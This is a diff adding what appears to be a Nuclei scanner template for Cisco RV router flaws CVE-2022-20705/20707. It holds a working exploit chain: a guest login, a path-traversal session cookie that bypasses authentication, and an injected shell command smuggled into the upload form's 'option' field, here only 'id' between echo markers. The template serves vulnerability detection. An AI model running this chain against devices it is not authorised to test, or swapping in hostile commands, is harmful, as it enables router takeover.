@@ -1,0 +1,71 @@
+id: cve-2022-20705
+
+info:
+  name: Cisco Small Business RV Series Routers Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    An arbitrary command execution vulnerability exists in Cisco Small Business RV series routers. This template exploits session bypass (CVE-2022-20705) followed by arbitrary command execution (CVE-2022-20707).
+  tags: command-execution
+  reference:
+    - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-smb-mult-vuln-KA9PK6D
+    - https://blog.relyze.com/2022/04/pwning-cisco-rv340-with-4-bug-chain.html
+
+variables:
+  cmd: "echo 202cb962ac5 && id && echo 7152d234b70"
+
+http:
+  - raw:
+      - |
+        POST /jsonrpc HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+
+        {"jsonrpc":"2.0","method":"login","params":{"user":"guest","pass":"Z3Vlc3Q=","lang":"English"}}
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTOhixyxIco1Wx8YP
+        Cookie: sessionid=../../../etc/firmware_version;sessionid=a1d5fd7a0a0583dac7a75bc
+
+        ------WebKitFormBoundaryTOhixyxIco1Wx8YP
+        Content-Disposition: form-data; name="sessionid"
+
+        a1d5fd7a0a0583dac7a75bc
+        ------WebKitFormBoundaryTOhixyxIco1Wx8YP
+        Content-Disposition: form-data; name="pathparam"
+
+        Signature
+        ------WebKitFormBoundaryTOhixyxIco1Wx8YP
+        Content-Disposition: form-data; name="fileparam"
+
+        file005
+        ------WebKitFormBoundaryTOhixyxIco1Wx8YP
+        Content-Disposition: form-data; name="destination"
+
+        123
+        ------WebKitFormBoundaryTOhixyxIco1Wx8YP
+        Content-Disposition: form-data; name="option"
+
+        ';{{cmd}} #
+        ------WebKitFormBoundaryTOhixyxIco1Wx8YP
+        Content-Disposition: form-data; name="file"; filename="1.txt"
+        Content-Type: text/plain
+
+        test
+        ------WebKitFormBoundaryTOhixyxIco1Wx8YP--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "202cb962ac5.*?7152d234b70"
